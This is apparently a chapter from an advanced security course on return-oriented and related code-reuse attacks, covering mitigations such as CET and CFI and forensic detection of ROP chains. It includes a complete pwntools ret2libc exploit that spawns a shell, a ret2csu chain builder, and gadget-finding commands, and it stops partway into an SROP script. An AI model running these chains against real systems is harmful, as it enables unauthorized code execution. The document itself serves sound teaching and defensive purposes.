---
corso: "Cybersecurity Masterclass"
fase: "Domain 4 — Code Reuse and Control Flow Attacks"
modulo: "4.A"
titolo: "Code Reuse and Control Flow Attacks"
versione: "pwntools 4.13+, ROPgadget 6.9+, Ropper 1.13+, rp++ 2.1+, glibc 2.39+, Linux 6.9+"
livello: "Advanced"
prerequisiti:
  - "Domain 1 — ELF GOT/PLT, PE IAT, RELRO, PT_GNU_PROPERTY"
  - "Domain 2 — Address space layout, ASLR, syscall dispatch, sigreturn, page permissions"
  - "Domain 3 — Stack buffer overflow, heap corruption, format string primitives"
  - "x86_64 calling conventions and System V ABI stack-frame layout"
  - "Basic GDB usage and Python scripting (pwntools)"
obiettivi:
  - "Classify code reuse techniques (ROP, JOP, COP, COOP, BOP, SROP, BROP) by chaining mechanism and defense-evasion properties"
  - "Construct a two-stage ret2libc ROP chain with ASLR bypass using pwntools against a NX-enabled binary"
  - "Implement SROP exploitation using SigreturnFrame to achieve arbitrary syscall execution with minimal gadgets"
  - "Evaluate the layered defense stack (W^X, ASLR, canaries, RELRO, CET, CFI) and identify residual attack surface at each layer"
  - "Perform automated gadget discovery, quality assessment, and bad-byte filtering using ROPgadget, Ropper, and rp++"
tag: [security, rop, jop, srop, brop, coop, code-reuse, exploitation, cet, cfi, gadgets, pwntools, stack-pivot]
---

# Domain 4 — Code Reuse and Control Flow Attacks

> **Learning Objectives**
>
> After completing this chapter, you will be able to:
>
> 1. Classify ROP, JOP, COP, COOP, BOP, SROP, and BROP by their chaining mechanism and the specific defense each variant evades.
> 2. Construct end-to-end ret2libc and SROP exploit chains against ASLR+NX targets using pwntools.
> 3. Use ROPgadget, Ropper, rp++, and one_gadget for automated gadget discovery with bad-byte filtering and quality assessment.
> 4. Analyze crash dumps and memory artifacts to identify ROP chain execution patterns for forensic triage.
> 5. Evaluate the residual attack surface after deploying each layer of the defense stack (W^X through fine-grained CFI).

> **Scope.** Return-oriented programming: gadget theory, classification, discovery, and chain construction. Stack pivoting. Jump-oriented programming. Call-oriented programming. Counterfeit object-oriented programming (COOP). Block-oriented programming. Sigreturn-oriented programming (SROP). Blind ROP (BROP). Defenses: Intel CET (IBT and Shadow Stack), AMD Shadow Stack, ARM Pointer Authentication (PAC) and Branch Target Identification (BTI), Microsoft Control Flow Guard (CFG) and eXtended Flow Guard (XFG), Clang CFI varieties, grsecurity/PaX RAP, stack canaries (`-fstack-protector-strong`, `-fstack-clash-protection`), canary entropy, and canary brute-force in forking servers.
>
> **Audience.** Detection engineers building signatures for exploitation artifacts, red teamers understanding the constraint landscape, software architects making mitigation adoption decisions, and incident responders reasoning about what an attacker can achieve post-corruption.
>
> **Prerequisites.** Domain 1 (ELF GOT/PLT, PE IAT, RELRO, CET notes in `PT_GNU_PROPERTY`), Domain 2 (address space layout, ASLR, syscall dispatch, `sigreturn`, page permissions). This chapter assumes familiarity with x86_64 calling conventions and basic stack-frame layout.

---

## 1. Foundations: why code reuse exists

Code reuse attacks arise from a single architectural fact: once an attacker controls the instruction pointer (or a value that influences it), they do not need to inject new code if the process already contains code fragments that perform useful operations. On a system with W^X (non-writable code, non-executable data), injecting shellcode into a data buffer and jumping to it fails because the data pages are NX. Code reuse bypasses W^X by chaining together existing executable fragments — "gadgets" — already present in the process's legitimate code.

The attacker needs two ingredients: a **corruption primitive** (a memory bug that lets them overwrite a control-flow pointer — a return address on the stack, a function pointer, a vtable pointer, a GOT entry) and a **gadget catalog** (knowledge of the addresses of useful code fragments in the process's mapped executable memory).

ASLR removes the second ingredient by randomizing code positions. Code reuse attacks therefore typically require an **information leak** (to defeat ASLR by revealing a code address) before the gadget chain can be constructed. The combination of W^X + ASLR + stack canaries is the baseline defense. Each code reuse variant targets a different facet of the remaining attack surface.

---

## 2. Return-oriented programming (ROP)

### 2.1 Core concept

ROP, formalized by Shacham (2007), chains short instruction sequences ending in `ret` ("gadgets") by overwriting the stack with a sequence of return addresses. Each `ret` pops the next address from the stack and jumps to it, executing the gadget's few instructions before the next `ret` chains to the next gadget. The stack becomes the program: each "slot" is an address (the next gadget) or a data operand consumed by a gadget's `pop` instruction.

On x86_64, a `ret` is a single byte (`0xC3`). Because x86 is variable-length, the byte `0xC3` can appear in the middle of a multi-byte instruction, creating "unintended" gadgets that begin at offsets the compiler never intended as instruction boundaries. This vastly expands the gadget space: a large binary like libc contains tens of thousands of usable gadgets at both intended and unintended boundaries.

### 2.2 Gadget classification

Gadgets are classified by function:

**Load/store gadgets.** Move data between registers and memory. Examples: `pop rdi; ret` (load a value from the stack into `rdi` — the first argument register, making it the "argument setter" for subsequent function calls), `mov [rdi], rsi; ret` (write `rsi` to the address in `rdi` — an arbitrary write), `mov rax, [rdi]; ret` (read from an address).

**Arithmetic/logic gadgets.** Perform computation: `add rax, rcx; ret`, `xor rdi, rdi; ret` (zero a register), `inc eax; ret`.

**Control flow gadgets.** Alter the chain's execution path: `jmp rax`, `call rax`, conditional jumps (rare in ROP because they end the chain unless the condition target also ends in `ret`).

**System call gadgets.** Set up and invoke a system call: `syscall; ret` (the most valuable single gadget — if you control `rax` for the syscall number and the argument registers, this gives arbitrary syscall execution). On x86_64, glibc and the vDSO typically contain at least one `syscall; ret` sequence.

**Stack pivot gadgets.** Redirect `rsp` to attacker-controlled memory, enabling a ROP chain to run from a location other than the original stack. This is needed when the attacker's stack overflow is too small to hold the entire chain, or when the corruption primitive writes to a heap buffer rather than the stack. Covered in §2.4.

### 2.3 Gadget discovery

Automated tools scan executable sections for byte sequences ending in `ret` (or other control-transfer instructions). The dominant tools in the research and red-team ecosystem:

**ROPgadget** scans ELF/PE binaries for gadgets at every possible instruction boundary (including unintended alignments), disassembles backward from each `ret`/`jmp`/`call`, and classifies the resulting sequences. It can also attempt automated chain generation for simple payloads (e.g., `execve("/bin/sh")`).

**Ropper** provides similar functionality with an interactive interface and supports filtering by register, operation, or constraint.

**rp++** is optimized for speed on large binaries and supports multiple architectures.

From a defender's perspective, gadget discovery is the attacker's planning phase. The defender's leverage is:

Reducing the gadget space: smaller binaries, fewer libraries loaded, LTO (Link-Time Optimization, which eliminates dead code and reduces total code size), and compiler-level gadget elimination (some compilers can rewrite instruction sequences to avoid unintended `ret` bytes, though this is not widespread).

Making gadgets unreliable: ASLR (gadget addresses are unknown), CET (gadgets that don't start with `ENDBR` are invalid indirect-branch targets), CFI (gadgets reachable only from valid call sites).

Detecting gadget chain execution: ROP chains have a distinctive execution pattern — many `ret` instructions in rapid succession, each returning to a different code region. Hardware performance counters (retired branch instructions, return-branch mispredictions) can detect this anomaly, and Intel's CET Shadow Stack catches it architecturally.

### 2.4 Stack pivoting

Stack pivoting redirects `rsp` to attacker-controlled memory. Common pivot gadgets:

`xchg rsp, rax; ret` — if the attacker controls `rax` (e.g., via a prior `pop rax; ret` gadget or via the corruption primitive), this swaps the stack to an arbitrary address.

`leave; ret` — equivalent to `mov rsp, rbp; pop rbp; ret`. If the attacker controls `rbp` (common in stack buffer overflows that overwrite the saved frame pointer), `leave` pivots the stack to the address in `rbp`. This is the most commonly used pivot on x86_64 because it's a standard function epilogue sequence that appears many times in any binary.

`pop rsp; ret` — directly pops a new stack pointer from the current stack. Requires the attacker to have the target address on the stack at the right position.

After pivoting, the attacker's ROP chain runs from the new location (typically a heap buffer, a global buffer, or a second-stage payload region).

### 2.5 The one_gadget technique

In many exploitation scenarios, the attacker doesn't need a long ROP chain — they just need to call `execve("/bin/sh", NULL, NULL)`. In specific builds of glibc, there exist code locations where, if execution arrives with certain register/stack constraints already satisfied, the remaining instructions naturally set up and execute `execve("/bin/sh", ...)` without any further gadget chaining. These are called "one gadgets" or "magic gadgets."

The constraints are version-specific and build-specific (they depend on the exact glibc compilation, optimization level, and ABI). An attacker who knows the target's glibc version can pre-compute the one-gadget offset and use it as a single-address exploit payload: overwrite a return address or function pointer with the one-gadget address, and if the register/stack constraints happen to be satisfied at the point of the hijack, `execve` fires immediately.

Detection: one-gadget exploitation results in a single unexpected control-flow transfer to a mid-function location in libc, followed by an `execve` syscall. The `execve` is the primary detection surface — any `execve("/bin/sh")` from a process that shouldn't be spawning shells is a high-confidence signal.

### 2.6 Practical gadget discovery: ROPgadget, Ropper, and rp++

Gadget discovery in practice begins with identifying the target binary's loaded libraries (via `ldd` or `/proc/<pid>/maps`) and scanning each for usable sequences. The following shows the actual tool invocations and their output interpretation.

**ROPgadget** scans a binary and outputs all gadgets, optionally filtering by register, operation, or generating an automatic chain:

```bash
# Enumerate all gadgets in a binary
ROPgadget --binary ./vuln_binary

# Search for gadgets in libc, filtering for pop rdi
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "pop rdi"

# Attempt automated chain generation for execve("/bin/sh")
ROPgadget --binary ./vuln_binary --ropchain

# Search for specific instruction patterns (e.g., syscall gadgets)
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall|ret"

# Filter by depth (maximum number of instructions per gadget)
ROPgadget --binary ./vuln_binary --depth 5
```

**Ropper** provides an interactive interface with semantic search and architecture-aware disassembly:

```bash
# Open a binary in Ropper
ropper -f ./vuln_binary

# Search for gadgets that set rdi (first argument register)
ropper -f ./vuln_binary --search "pop rdi"

# Search for stack pivot gadgets
ropper -f ./vuln_binary --search "xchg rsp"
ropper -f ./vuln_binary --search "leave"

# Search for syscall gadgets
ropper -f /lib/x86_64-linux-gnu/libc.so.6 --search "syscall"

# Export gadgets in a format usable by pwntools
ropper -f ./vuln_binary --type rop
```

**rp++** is optimized for speed on large binaries. It scans multi-gigabyte binaries (like a Windows kernel image) in seconds:

```bash
# Scan with maximum gadget depth of 6 instructions
rp++ -f ./vuln_binary -r 6

# Filter for specific register operations
rp++ -f ./vuln_binary -r 5 | grep "pop rdi ; ret"
```

**one_gadget** is a specialized tool that finds execve one-shot gadgets in a specific libc build:

```bash
# Find one-gadgets in the target libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Output example:
# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#
# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
#
# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```

Each one_gadget comes with constraints that must be satisfied at the moment of the hijack. The attacker must verify (via GDB inspection at the corruption point) which constraints hold and select the matching one_gadget.

### 2.7 Complete ret2libc chain construction with pwntools

The classic ret2libc attack redirects execution to `system("/bin/sh")` in libc. On x86_64, the first argument goes in `rdi`, so the chain needs a `pop rdi; ret` gadget to load the address of the `"/bin/sh"` string into `rdi` before calling `system`. A `ret` gadget is often needed before the `system` call to fix 16-byte stack alignment required by the System V ABI (glibc's `system` calls `movaps`, which faults on unaligned `rsp`).

```python
#!/usr/bin/env python3
"""ret2libc exploit: system("/bin/sh") via ROP chain."""
from pwn import *

# Target configuration
context.binary = elf = ELF("./vuln_binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Connect to the target
p = process("./vuln_binary")
# p = remote("target.example.com", 1337)  # for remote targets

# --- Phase 1: Leak a libc address to defeat ASLR ---
# Overflow to call puts(puts@GOT), which prints the resolved
# address of puts in libc. Then return to main to restart.
pop_rdi = elf.search(asm("pop rdi; ret")).__next__()
ret     = elf.search(asm("ret")).__next__()

payload  = b"A" * 72                  # padding to saved RIP
payload += p64(pop_rdi)               # gadget: pop rdi; ret
payload += p64(elf.got["puts"])       # rdi = &GOT[puts]
payload += p64(elf.plt["puts"])       # call puts(GOT[puts])
payload += p64(elf.symbols["main"])   # return to main for round 2

p.sendlineafter(b"> ", payload)

# Parse the leaked puts address (6 bytes on x86_64)
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Leaked puts@libc: {hex(leaked)}")

# Calculate libc base from the leak
libc.address = leaked - libc.symbols["puts"]
log.info(f"libc base: {hex(libc.address)}")

# --- Phase 2: Call system("/bin/sh") ---
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload2  = b"A" * 72                 # same padding
payload2 += p64(ret)                  # stack alignment fix
payload2 += p64(pop_rdi)              # pop rdi; ret
payload2 += p64(bin_sh)               # rdi = "/bin/sh"
payload2 += p64(libc.symbols["system"])  # call system("/bin/sh")

p.sendlineafter(b"> ", payload2)
p.interactive()
```

This two-stage pattern (leak then exploit) is the canonical approach against ASLR-protected targets. The first stage uses the binary's own PLT/GOT to leak a libc address; the second stage uses the leaked base to compute the runtime addresses of `system` and `"/bin/sh"`.

### 2.8 The ret2csu technique

On x86_64 ELF binaries linked with glibc, the `__libc_csu_init` function contains two gadget sequences that provide controlled calls with up to three arguments without needing separate `pop rdi/rsi/rdx` gadgets. This is valuable in stripped or small binaries where the usual register-setting gadgets are absent.

The first gadget (the "popping gadget") is at the end of `__libc_csu_init`:

```asm
pop rbx        ; 0
pop rbp        ; 1 (set to 1 for the cmp below)
pop r12        ; call target (edi = r12d)
pop r13        ; second arg (rsi = r13)
pop r14        ; third arg (rdx = r14)
pop r15        ; function pointer table address
ret
```

The second gadget (the "calling gadget") is earlier in the function:

```asm
mov rdx, r14        ; third argument
mov rsi, r13        ; second argument
mov edi, r12d       ; first argument (note: 32-bit, upper 32 bits of rdi zeroed)
call [r15+rbx*8]    ; indirect call through function pointer table
add rbx, 1
cmp rbp, rbx        ; if rbp==rbx, fall through (no loop)
jne <loop>
; falls through to the popping gadget again
```

The chain works as follows: the attacker first returns to the popping gadget, loading controlled values into `rbx` (set to 0), `rbp` (set to 1, so the `cmp` after the call falls through), `r12` (first argument), `r13` (second argument), `r14` (third argument), and `r15` (address of a GOT entry or other writable pointer containing the target function address). Then execution flows to the calling gadget, which moves the arguments into the correct ABI registers and calls through `[r15]`.

The limitation is that `edi` receives only the lower 32 bits of `r12`, so the first argument is restricted to 32-bit values (sufficient for file descriptors, flags, and small integers, but not for 64-bit pointers like string addresses). The target of the `call` must be an address containing a function pointer (typically a GOT entry), not a direct function address.

```python
"""ret2csu helper for pwntools."""
from pwn import *

def ret2csu(elf, func_got, rdi, rsi, rdx, rbx=0, rbp=1):
    """Build a ret2csu chain.

    Args:
        elf: pwntools ELF object
        func_got: address of a GOT entry pointing to the target function
        rdi: first argument (only lower 32 bits used)
        rsi: second argument
        rdx: third argument
    """
    csu_pop = elf.symbols["__libc_csu_init"] + 0x5a  # offset varies by build
    csu_call = elf.symbols["__libc_csu_init"] + 0x40  # offset varies by build

    chain  = p64(csu_pop)
    chain += p64(rbx)           # rbx = 0
    chain += p64(rbp)           # rbp = 1
    chain += p64(rdi)           # r12 -> edi
    chain += p64(rsi)           # r13 -> rsi
    chain += p64(rdx)           # r14 -> rdx
    chain += p64(func_got)      # r15, call [r15+rbx*8]
    chain += p64(csu_call)
    # After the call returns, the loop check (cmp rbp, rbx+1) passes
    # and falls through to the pop sequence again. Pad 7 qwords for
    # the subsequent pops (rbx, rbp, r12, r13, r14, r15, ret).
    chain += p64(0) * 7
    return chain
```

The exact offsets (`+0x5a`, `+0x40`) depend on the glibc version and compilation flags. The attacker determines them by disassembling `__libc_csu_init` in the target binary. In recent glibc versions (2.34+), `__libc_csu_init` has been removed, making ret2csu unavailable on newer binaries. Alternatives include `ret2dlresolve` and using gadgets from other CRT startup code.

### 2.9 CVE case study: CVE-2020-0796 (SMBGhost) — ROP in kernel exploitation

CVE-2020-0796 is an integer overflow in the Windows SMBv3 compression handler (`srv2.sys`). When the SMB server processes a specially crafted compressed message, the `OriginalCompressedSegmentSize` and `Offset` fields in the compression transform header are added without overflow checking. The resulting undersized allocation leads to an out-of-bounds write into the kernel nonpaged pool.

Public proof-of-concept exploits for local privilege escalation constructed ROP chains within the kernel address space. The exploitation pattern illustrates how ROP operates in kernel context:

**The corruption primitive.** The integer overflow allows the attacker to write controlled data past the end of a kernel pool allocation. By grooming the pool (filling it with controlled objects of known size to create predictable adjacent allocations), the attacker positions a target object (typically a `_TOKEN` structure or a pipe attribute buffer) adjacent to the overflowed buffer. The overflow corrupts the target object's function pointer or metadata.

**The constraint landscape.** Kernel-mode exploitation on Windows 10 1903+ faces SMEP (Supervisor Mode Execution Prevention, which prevents executing user-mode pages from kernel mode), KASLR (randomized kernel base), and kCFG (kernel Control Flow Guard). The attacker cannot jump to user-mode shellcode and cannot call arbitrary kernel functions without bypassing kCFG.

**The ROP approach.** Public PoCs used the following strategy: (1) leak a kernel pointer via the same SMB vulnerability or via a separate information disclosure to defeat KASLR, (2) locate gadgets in `ntoskrnl.exe` at known offsets from the leaked base, (3) construct a ROP chain on the kernel stack that calls `nt!SeSetAccessStateGenericMapping` or another function to modify the current process's `_TOKEN` privileges, escalating to SYSTEM. The chain required `pop rcx; ret` and `pop rdx; ret` gadgets to set arguments, followed by a call to the privilege-manipulation function.

This CVE demonstrates that ROP remains the primary post-corruption exploitation technique even in modern kernel environments where W^X, SMEP, and CFG are all active. The mitigations raise the complexity bar (the attacker needs an info leak, a pool grooming strategy, and kCFG-compatible gadgets) but do not architecturally prevent the chain. Hardware shadow stacks (CET SHSTK on Intel, not yet deployed in the Windows kernel at the time of CVE-2020-0796's exploitation) would have caught the return-address corruption on the kernel stack.

### 2.10 ROP artifacts in memory and crash analysis

From a forensics and detection perspective, a ROP chain leaves distinctive artifacts in memory dumps and crash reports.

**Stack layout.** A ROP chain occupies the stack as a sequence of 8-byte values where almost every value is a code address (pointing into executable sections of loaded modules). In normal execution, a stack frame contains a mix of local variables (arbitrary data), saved frame pointers, and return addresses. A ROP chain has no local variables — every slot is either a gadget address or a data operand for a `pop` instruction. A stack region where 80%+ of consecutive 8-byte values resolve to addresses within `.text` sections of loaded modules is a strong ROP indicator.

**Crash dump patterns.** When a ROP chain fails partway (a gadget faults, an address is wrong due to partial ASLR bypass), the crash dump contains a partially executed chain. The faulting instruction is typically a `ret` or a few instructions before a `ret`, and the stack at the crash point shows the remaining un-executed chain. The crash address is inside a legitimate module (not in a heap or data region, which would indicate shellcode execution), and the stack backtrace consists of many "frames" with impossibly small sizes (1-3 instructions each).

**Register state.** At the point of a ROP crash, registers often contain values that make sense as syscall arguments or function parameters (small integers in `rax`, pointers to strings like `"/bin/sh"` in `rdi`, `0x7` or `0xa` in `rdx` for `mprotect` flags) rather than the normal mix of working-set values. This is because the ROP chain has been setting up registers for a function call or syscall.

**Volatility 3 analysis.** In a Linux memory dump analyzed with Volatility 3, the `linux.proc_maps` plugin reveals loaded module ranges, and manual stack inspection (reading the stack VMA) allows identifying ROP chain patterns. The `linux.check_syscall` plugin can detect syscall table modifications that sometimes accompany kernel ROP chains. On Windows, the `windows.vadinfo` plugin combined with stack inspection serves the same purpose.

---

## 3. Jump-oriented programming (JOP)

### 3.1 Motivation

ROP depends on `ret` for chaining. Defenses that specifically target `ret` (e.g., shadow stacks, which validate return addresses) break ROP. JOP, introduced by Bletsch et al. (2011), replaces `ret` with `jmp` and uses a different chaining mechanism.

### 3.2 Mechanism

JOP uses a **dispatcher gadget** — a gadget that loads a target address from a table and jumps to it, advancing the table pointer after each dispatch. Conceptually:

```
dispatcher:
    mov rax, [rbx]     ; load next gadget address from table
    add rbx, 8         ; advance table pointer
    jmp rax            ; dispatch
```

Each **functional gadget** performs its operation and ends with `jmp` back to the dispatcher (or to another functional gadget). The "program" is the table of addresses at `[rbx]`, analogous to the ROP chain on the stack.

JOP requires the attacker to control a register pointing to the dispatch table and to find a suitable dispatcher gadget in the binary. In practice, pure JOP chains are harder to construct than ROP chains because suitable dispatcher gadgets are rarer and the register constraints are tighter. Hybrid chains (ROP for setup, JOP for the payload) are more common.

### 3.3 Dispatcher gadget construction example

A practical JOP chain requires three components: (1) an initializer that loads the dispatch table pointer into a register, (2) the dispatcher gadget itself, and (3) functional gadgets that end with a jump back to the dispatcher. Consider the following concrete dispatcher found in a large binary:

```asm
; Dispatcher gadget found at offset 0x4a120 in target binary
dispatcher:
    mov rax, qword [rsi]     ; load next gadget address from table
    lea rsi, [rsi+8]         ; advance table pointer
    jmp rax                  ; dispatch to functional gadget
```

Each functional gadget performs its work and ends with `jmp [rsi]` or `jmp dispatcher_addr` to return control to the dispatcher. For example:

```asm
; Functional gadget: set rdi to a controlled value
gadget_set_rdi:
    pop rdi                  ; load value from a secondary data region
    jmp dispatcher           ; return to dispatcher

; Functional gadget: call a function pointer
gadget_call:
    mov rax, qword [rdi]    ; load function pointer from controlled address
    call rax                 ; execute
    jmp dispatcher           ; return to dispatcher
```

The dispatch table is an array of gadget addresses that the attacker places in a controlled memory region (heap buffer, global variable, or the stack itself after pivoting). The dispatcher iterates through the table, executing each gadget in sequence.

In practice, finding a clean dispatcher gadget like the one above is rare. More commonly, the attacker uses "imperfect" dispatchers — gadgets that advance through a table but also modify other registers or memory — and accounts for the side effects in the functional gadgets. Automated JOP chain generation tools (research prototypes like JOP ROCKET) search for dispatcher/functional gadget combinations, but the technique remains significantly harder to deploy than ROP.

### 3.4 Defenses

CET IBT (§8.1) defends against JOP: every indirect `jmp` target must begin with `ENDBR64`. Most functional gadgets at unintended offsets do not begin with `ENDBR64` and are therefore invalid targets. CFI (§8.4) provides similar protection by constraining which addresses an indirect jump can reach.

---

## 4. Call-oriented programming (COP)

COP uses `call` instructions rather than `ret` or `jmp` for chaining. The attacker hijacks an indirect `call` (via a corrupted function pointer, vtable entry, or PLT/GOT entry) to reach a gadget that ends in another indirect `call`, creating a chain.

COP is particularly relevant in C++ code, where vtable-based dispatch provides a natural supply of indirect `call` sites. The attacker corrupts a vtable pointer to redirect virtual method calls to a chain of gadgets.

COP chains are constrained by the `call` semantics: each `call` pushes a return address onto the stack, consuming stack space and potentially disrupting later operations. COP gadgets must account for this.

### 4.1 Vtable spray technique

In C++ code, COP attacks typically exploit virtual dispatch. The attacker corrupts an object's vtable pointer to redirect virtual method calls. The vtable spray technique creates a controlled memory region filled with a fake vtable that redirects multiple virtual method slots to attacker-chosen gadgets.

```cpp
// Simplified vulnerable C++ pattern
class Base {
public:
    virtual void processInput(const char* data) = 0;
    virtual void cleanup() = 0;
};

// Attacker's counterfeit vtable layout:
// The attacker allocates a heap buffer and fills it with a fake vtable
// pointing to gadgets that chain through successive virtual calls.
struct FakeVtable {
    void* slot_processInput;  // -> gadget: pop rdi; call [rax+0x10]
    void* slot_cleanup;       // -> gadget: mov rdi, rax; call [rax+0x18]
    void* slot_chain1;        // -> target function (e.g., system)
    void* slot_chain2;        // -> "/bin/sh" string address
};
```

The attacker uses a use-after-free or type confusion to replace the object's vtable pointer with a pointer to the fake vtable. When the program calls `obj->processInput(data)`, the virtual dispatch reads the function pointer from the fake vtable's `slot_processInput`, executing the attacker's gadget. Each gadget ends with an indirect `call` that reads the next target from the fake vtable, chaining the attack.

Real-world COP exploitation appeared in browser vulnerabilities (CVE-2015-0318 in Adobe Flash, CVE-2021-21224 in V8) where C++ object corruption allowed vtable hijacking. Browser engines are prime COP targets due to their heavy use of C++ polymorphism and the attacker's ability to control object lifetimes through JavaScript.

Defenses: forward-edge CFI (§9.4) constrains indirect `call` targets. CET IBT requires `ENDBR64` at every indirect call target.

---

## 5. Counterfeit object-oriented programming (COOP)

### 5.1 Concept

COOP, introduced by Schuster et al. (2015), exploits C++ virtual dispatch specifically. Rather than chaining arbitrary gadgets, COOP chains **entire virtual method bodies** — legitimate C++ virtual functions that happen to perform useful operations (reading a field, calling another virtual method with controlled arguments, performing arithmetic).

The attacker creates a counterfeit C++ object: a fake vtable pointing to a selected set of existing virtual methods (from the same binary or loaded libraries), and fake object fields initialized with attacker-controlled data. When the program dispatches a virtual call on the counterfeit object, it executes a legitimate virtual method body on attacker-controlled data, producing an attacker-desired side effect.

A **main loop gadget** iterates over a container of objects and calls a virtual method on each — a pattern common in C++ (e.g., iterating over a vector of base-class pointers and calling `process()` on each). The attacker fills the container with counterfeit objects, each with a different vtable entry, and the loop chains them together.

### 5.2 Why COOP is significant

COOP is significant because it operates within the constraints of coarse-grained CFI: every indirect call target is a real function start, every object is a real class instance (from the type system's perspective), and the chain executes entirely through valid basic-block transitions. CFI that only validates "is this a valid function start?" cannot distinguish a COOP chain from legitimate polymorphic dispatch.

### 5.3 Counterfeit object layout in practice

A COOP attack constructs fake C++ objects with carefully chosen vtable pointers and field values. Consider a program that iterates over a `std::vector<Widget*>` and calls `widget->execute()` on each element. The attacker's counterfeit objects use vtables of existing classes whose `execute()` methods perform useful primitive operations:

```cpp
// Existing classes in the target binary (compiled with their own vtables)
class FileReader : public Widget {
    const char* path;  // offset 0x08 from object base
public:
    void execute() override {
        // Opens this->path and reads contents — useful for reading
        // arbitrary files if the attacker controls the path field
        int fd = open(this->path, O_RDONLY);
        // ...
    }
};

class CommandRunner : public Widget {
    const char* cmd;   // offset 0x08 from object base
public:
    void execute() override {
        // Calls system(this->cmd) — the COOP jackpot
        system(this->cmd);
    }
};

// Attacker's counterfeit object in heap-sprayed memory:
// Bytes 0x00-0x07: pointer to CommandRunner's vtable (legitimate vtable)
// Bytes 0x08-0x0F: pointer to "/bin/sh\0" string
//
// When the main loop calls counterfeit->execute(), virtual dispatch
// reads the vtable pointer, finds CommandRunner::execute, and calls it.
// The method reads this->cmd (at offset 0x08 from the object base),
// which the attacker has set to point to "/bin/sh". The entire chain
// consists of legitimate virtual method calls on attacker-controlled data.
```

The main loop gadget — iterating over a container and calling a virtual method on each element — is extremely common in C++ applications. Rendering loops, event dispatch loops, plugin initialization, and serialization frameworks all follow this pattern. The attacker populates the container with counterfeit objects (via heap spray or by corrupting the container's internal pointers), and the loop chains them together without any explicit control-flow hijack beyond the initial vtable pointer corruption.

The defense against COOP is **fine-grained CFI with type awareness** — ensuring that each virtual call site can only reach methods of the correct class type (not just any virtual method in the binary). Clang's `-fsanitize=cfi-vcall` provides this level of checking. XFG on Windows adds prototype-hash matching that similarly constrains which virtual methods a call site can reach.

---

## 6. Block-oriented programming (BOP)

BOP, described by Ispoglou et al. (2018), constructs chains from valid basic blocks (as defined by a CFI policy). Where CFI constrains which blocks can follow which, BOP searches the control-flow graph for paths through legitimate blocks that, when composed, achieve the attacker's goal. Each block is entered through a valid CFI edge and exits through a valid CFI edge, so the chain is invisible to CFI checks.

BOP is primarily an academic result demonstrating that coarse-grained CFI (which allows any function to call any other function at a valid call site) still permits significant code reuse. The practical difficulty is finding useful BOP chains in a specific binary — the search space is large and the constraints are tight. Fine-grained CFI with type checking narrows the search space further.

---

## 7. Sigreturn-oriented programming (SROP)

### 7.1 Background: `sigreturn`

When the kernel delivers a signal to a user process, it saves the process's entire register state (including `rsp`, `rip`, `rflags`, and all GPRs) onto the user stack in a `struct sigframe` (or `struct rt_sigframe` on x86_64), sets `rip` to the signal handler, and resumes. When the signal handler returns, it calls `rt_sigreturn` (syscall 15 on x86_64), which tells the kernel to restore the register state from the `sigframe` on the stack.

The key insight: the kernel does not validate that the `sigframe` was actually created by the kernel. It reads whatever is on the stack at the expected position and loads the registers from it. If an attacker can place a crafted `sigframe` on the stack and call `rt_sigreturn`, they can set every register — including `rip`, `rsp`, and the syscall-argument registers — to arbitrary values.

### 7.2 The `sigframe` on x86_64

The `rt_sigframe` structure on x86_64 (defined in `arch/x86/include/asm/sigframe.h`) contains, among other fields:

```
struct rt_sigframe {
    char __user *pretcode;      /* return address (sigreturn trampoline) */
    struct ucontext uc;
    /* uc.uc_mcontext.gregs contains: */
    /*   R8, R9, R10, R11, R12, R13, R14, R15 */
    /*   RDI, RSI, RBP, RBX, RDX, RAX, RCX, RSP */
    /*   RIP, EFLAGS, CS, GS, FS, ... */
    struct siginfo info;
};
```

The `uc_mcontext.gregs` array within `ucontext` contains all general-purpose registers. By crafting this array, the attacker controls every register after `sigreturn`.

### 7.3 SROP attack construction

The minimal SROP chain:

1. The attacker corrupts a return address (or pivots the stack) to point at a `syscall; ret` gadget (or just `syscall`), with `rax` set to 15 (`__NR_rt_sigreturn`).
2. Below the return address on the stack, the attacker places a crafted `sigframe` with desired register values.
3. `sigreturn` executes, restoring all registers from the fake frame. `rip` is set to the attacker's chosen value (e.g., another `syscall` gadget), `rax` is set to the desired syscall number, and `rdi`, `rsi`, `rdx` are set to the desired arguments.
4. Execution resumes at the new `rip` with fully controlled registers. The attacker can execute any syscall.

SROP reduces a code-reuse attack to needing exactly one gadget: `syscall; ret` (or even just `syscall`). Everything else — register setup, argument marshaling, chaining — is done through the fake signal frame, which is pure data on the stack.

### 7.4 Chaining SROP

A single `sigreturn` sets up one syscall. To chain multiple syscalls, the attacker sets `rsp` in the fake frame to point at the next fake frame, and `rip` to point at the `syscall; ret` gadget with `rax = 15` again. After the first syscall completes (e.g., `mprotect` to make a region writable+executable), the `ret` returns into the next `sigreturn`, which sets up the next syscall (e.g., `read` to read shellcode into the now-executable region), and so on.

### 7.5 Defenses against SROP

**Shadow stacks (CET)**: prevent `ret` from chaining to the `syscall; ret` gadget if the return address doesn't match the shadow stack. The attacker needs a non-`ret` path to the `syscall` instruction.

**Signal-frame cookies**: some hardened kernels or runtimes place a random cookie in the signal frame and validate it on `sigreturn`. If the cookie doesn't match, `sigreturn` is rejected. This is not present in mainline Linux but has been proposed and implemented in some hardened forks.

**Seccomp**: filtering `rt_sigreturn` is impractical (it's needed for normal signal handling), but seccomp can restrict the subsequent syscall that SROP sets up (e.g., deny `execve`, `mprotect` with `PROT_EXEC`, etc.).

**ASLR**: the attacker still needs to know the address of the `syscall; ret` gadget.

### 7.6 Complete SROP exploitation with pwntools

Pwntools provides the `SigreturnFrame` class, which constructs a fake signal frame with arbitrary register values. The following demonstrates a two-stage SROP chain: first calling `mprotect` to make a memory region writable and executable, then reading shellcode into that region via `read`.

```python
#!/usr/bin/env python3
"""SROP exploit: mprotect + read + shellcode execution."""
from pwn import *

context.arch = "amd64"
context.os = "linux"

p = process("./vuln_srop")
